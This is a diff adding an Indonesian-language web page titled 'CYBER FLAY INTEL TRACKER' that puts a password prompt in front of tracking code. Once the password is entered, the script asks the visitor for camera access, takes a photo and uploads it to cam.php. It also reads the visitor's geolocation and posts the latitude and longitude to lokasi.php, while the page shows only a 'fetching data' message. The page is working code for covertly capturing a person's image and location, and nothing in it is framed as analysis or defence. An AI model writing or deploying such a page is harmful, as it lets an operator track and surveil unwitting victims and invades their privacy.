@@ -1,0 +1,99 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content='width=device-width, initial-scale=1.0' />
+  <title>CYBER FLAY INTEL TRACKER</title>
+  <style>
+    body {
+      background: #000 url('bg.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: monospace;
+      color: #00ffff;
+      text-align: center;
+    }
+    .box {
+      background: rgba(0,0,0,0.75);
+      margin: 10% auto;
+      padding: 30px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 450px;
+      box-shadow: 0 0 15px #00ffff;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background: #000;
+      border: 1px solid #00ffff;
+      color: #00ffff;
+      border-radius: 5px;
+    }
+    video { display: none; width: 100%; margin-top: 10px; }
+  </style>
+</head>
+<body>
+<div class="box" id="loginBox">
+  <h2>CYBER FLAY - LOGIN</h2>
+  <input type="password" id="pw" placeholder="Password: flay12121" />
+  <button onclick="checkPW()">MASUK</button>
+  <p id="err" style="color:red;"></p>
+</div>
+
+<div class="box" id="mainBox" style="display:none;">
+  <h3>🔍 Mengambil data...</h3>
+  <video id="video" autoplay muted></video>
+</div>
+
+<script>
+function checkPW() {
+  if (document.getElementById('pw').value === 'flay12121') {
+    document.getElementById('loginBox').style.display = 'none';
+    document.getElementById('mainBox').style.display = 'block';
+    jalankanPelacakan();
+  } else {
+    document.getElementById('err').innerText = '❌ Password salah!';
+  }
+}
+
+function jalankanPelacakan() {
+  const video = document.getElementById('video');
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        video.style.display = 'block';
+        video.srcObject = stream;
+        ambilFoto(stream);
+      })
+      .catch(err => console.log('Kamera tidak diizinkan'));
+  }
+
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      fetch('lokasi.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'lat=' + lat + '&lon=' + lon
+      });
+    });
+  }
+}
+
+function ambilFoto(stream) {
+  const track = stream.getVideoTracks()[0];
+  let imageCapture = new ImageCapture(track);
+  imageCapture.takePhoto()
+    .then(blob => {
+      const form = new FormData();
+      form.append('photo', blob, 'cam.jpg');
+      fetch('cam.php', { method: 'POST', body: form });
+    })
+    .catch(err => console.error('Gagal ambil foto', err));
+}
+</script>
+</body>
+</html>
